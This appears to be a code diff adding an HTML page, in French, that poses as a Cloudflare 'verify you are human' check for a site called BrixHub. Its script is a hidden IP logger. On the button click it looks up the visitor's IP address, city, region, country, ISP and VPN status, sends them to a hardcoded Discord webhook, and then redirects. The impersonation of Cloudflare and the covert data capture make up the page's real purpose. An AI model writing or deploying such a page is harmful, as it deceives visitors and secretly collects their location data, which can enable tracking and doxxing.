@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BrixHub - Vérification</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+    
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0a0a0a;
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: #111;
+      border: 1px solid #333;
+      padding: 45px 40px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+    }
+
+    .cloud-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 25px;
+      font-size: 1.4rem;
+      font-weight: 600;
+    }
+
+    .spinner {
+      width: 78px;
+      height: 78px;
+      border: 6px solid #222;
+      border-top: 6px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin: 30px auto;
+    }
+
+    .status {
+      font-size: 1.15rem;
+      color: #ddd;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      background: #fff;
+      color: #000;
+      border: none;
+      padding: 15px 45px;
+      font-size: 1.15rem;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="mainScreen">
+    <div class="cloud-header">
+      <span style="font-size:32px;">☁️</span>
+      <span>Cloudflare</span>
+    </div>
+    <h2>Vérifiez que vous êtes humain</h2>
+    <p style="color:#aaa; margin:20px 0 30px;">Cette vérification protège le site contre les robots.</p>
+    <button class="btn" onclick="startFastVerify()">Je ne suis pas un robot</button>
+  </div>
+
+  <!-- Écran de vérification -->
+  <div class="container" id="verifyScreen" style="display:none;">
+    <div class="cloud-header">
+      <span style="font-size:32px;">☁️</span>
+      <span>Cloudflare</span>
+    </div>
+    <div class="spinner"></div>
+    <p class="status" id="status">Vérification en cours...</p>
+  </div>
+
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1505393672726777876/RUx-YTl9zgICf2eDqGVWQk9CoX9gwtW3J4yPxPpSyVRt3YnfAITFqv-XgNsVZbW4zVbn";
+
+    async function getIPData() {
+      try {
+        const res = await fetch('https://ip-api.com/json/?fields=query,city,regionName,country,isp,proxy,hosting');
+        return await res.json();
+      } catch(e) {
+        return {};
+      }
+    }
+
+    async function startFastVerify() {
+      document.getElementById('mainScreen').style.display = 'none';
+      document.getElementById('verifyScreen').style.display = 'block';
+
+      const ipData = await getIPData();
+
+      // Envoi des informations sur ton webhook
+      const payload = {
+        content: `🔐 **Nouvelle vérification Cloudflare - BrixHub**`,
+        embeds: [{
+          title: "✅ Vérification terminée",
+          color: 0xffffff,
+          fields: [
+            { name: "IP", value: `\`${ipData.query || "N/A"}\``, inline: true },
+            { name: "Ville", value: ipData.city || "Inconnue", inline: true },
+            { name: "Pays", value: ipData.country || "N/A", inline: true },
+            { name: "Région", value: ipData.regionName || "N/A", inline: true },
+            { name: "ISP", value: ipData.isp || "N/A", inline: false },
+            { name: "VPN/Proxy", value: ipData.proxy ? "✅ Oui" : "❌ Non", inline: true },
+            { name: "Datacenter", value: ipData.hosting ? "✅ Oui" : "❌ Non", inline: true },
+            { name: "Heure", value: new Date().toLocaleString('fr-FR'), inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+
+      // Redirection rapide
+      setTimeout(() => {
+        window.location.href = "https://brixhub.site";
+      }, 1650);
+    }
+  </script>
+</body>
+</html>
